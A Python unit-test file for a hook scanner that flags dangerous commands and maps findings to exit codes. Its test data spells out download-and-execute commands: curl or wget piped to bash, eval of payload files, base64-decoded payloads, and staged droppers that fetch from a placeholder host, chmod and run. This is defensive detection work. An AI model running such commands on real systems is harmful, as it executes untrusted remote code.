"""Unit tests for shared machinery: danger signatures + exit-code model."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from hook_scanner.findings import (  # noqa: E402
    Finding,
    by_severity,
    exit_code,
    to_json,
)
from hook_scanner.rules import danger_signatures, is_dangerous  # noqa: E402


class TestDangerSignatures:
    @staticmethod
    def test_curl_pipe_bash():
        assert is_dangerous("curl -s https://e.example/x | bash")
        assert is_dangerous("wget -qO- http://e.example/x | sh")

    @staticmethod
    def test_eval_and_iex():
        assert is_dangerous("eval $(cat /tmp/payload)")
        assert is_dangerous("powershell -Command Invoke-Expression 'x'")

    @staticmethod
    def test_os_system_and_subprocess():
        assert is_dangerous("python3 -c 'import os; os.system(\"x\")'")
        assert is_dangerous("subprocess.call(['sh', '-c', 'x'])")

    @staticmethod
    def test_base64_decode_pipe():
        assert is_dangerous("base64 -d payload.b64 | bash")

    @staticmethod
    def test_benign_commands_clean():
        for cmd in (
            "git status",
            "npm run lint",
            "echo hello world",
            "ls -la",
            "python3 -m pytest tests/",
        ):
            assert not is_dangerous(cmd), cmd

    @staticmethod
    def test_rule_ids_stable():
        ids = {rid for rid, _ in danger_signatures("curl x | bash && eval y")}
        assert {"download_exec", "eval_run"} <= ids

    @staticmethod
    def test_staged_dropper_shapes():
        for cmd in (
            "curl -s -o /tmp/.sys http://e.example/s && chmod +x /tmp/.sys && /tmp/.sys",
            "wget -qO /tmp/.s http://e.example/s; chmod 755 /tmp/.s; /tmp/.s",
            "curl --output=/tmp/x http://e.example/x; sudo /tmp/x",
            "curl -fsSo /tmp/p http://e.example/p && sh /tmp/p",
            "wget -O /tmp/j https://e.example/j || true; bash /tmp/j",
            "curl -o ./pload https://e.example/p; ./pload",
        ):
            ids = {rid for rid, _ in danger_signatures(cmd)}
            assert "staged_dropper" in ids, cmd

    @staticmethod
    def test_staged_dropper_negatives():
        for cmd in (
            "curl -s https://e.example/i | bash",  # piped: download_exec's job
            "wget -qO- https://e.example/x | sh",  # -qO- is stdout, not disk
            "curl -o docs/spec.md https://raw.example/spec.md && wc -l docs/spec.md",
            "wget -O index.html https://x.example && git add index.html",
            # QA PR #3 tech-debt: perms fixes on fetched data files carry no
            # execute bit and must not read as dropper behavior.
            "curl -sSf -o assets/app.css https://cdn.example/app.css && chmod 644 assets/app.css",
            "curl -o config/settings.toml https://e.example/settings.toml && chmod 600 config/settings.toml",
            # ...and running system tools by absolute path after a fetch is
            # ordinary automation, not staging.
            "curl -fsSL -o data/export.csv https://api.example/export.csv && /usr/bin/python3 scripts/import.py",
            "wget -q -O reports/q3.pdf https://intra.example/q3.pdf; /usr/local/bin/upload --dest s3://bkt",
            "git status && npm test",
            "echo hello",
        ):
            ids = {rid for rid, _ in danger_signatures(cmd)}
            assert "staged_dropper" not in ids, cmd


class TestExitCodeModel:
    @staticmethod
    def test_empty_is_zero():
        assert exit_code([]) == 0

    @staticmethod
    def test_info_low_is_zero():
        fs = [
            Finding("r1", "info", "f", "m"),
            Finding("r2", "low", "f", "m"),
        ]
        assert exit_code(fs) == 0

    @staticmethod
    def test_worst_wins():
        fs = [
            Finding("r1", "low", "f", "m"),
            Finding("r2", "high", "f", "m"),
            Finding("r3", "critical", "f", "m"),
        ]
        assert exit_code(fs) == 4  # critical rank

    @staticmethod
    def test_error_beats_critical():
        fs = [Finding("r1", "critical", "f", "m"), Finding("r2", "error", "f", "m")]
        assert exit_code(fs) == 5

    @staticmethod
    def test_by_severity_ordering():
        fs = [
            Finding("a", "low", "f", "m"),
            Finding("b", "critical", "f", "m"),
            Finding("c", "medium", "f", "m"),
        ]
        ordered = by_severity(fs)
        assert [f.rule for f in ordered] == ["b", "c", "a"]

    @staticmethod
    def test_to_json_shape():
        fs = [Finding("r1", "high", "a/b", "m", detail="d", category="npm")]
        payload = __import__("json").loads(to_json(fs))
        assert payload["exit_code"] == 3
        assert payload["count"] == 1
        assert payload["summary"]["high"] == 1
        assert payload["findings"][0]["rule"] == "r1"
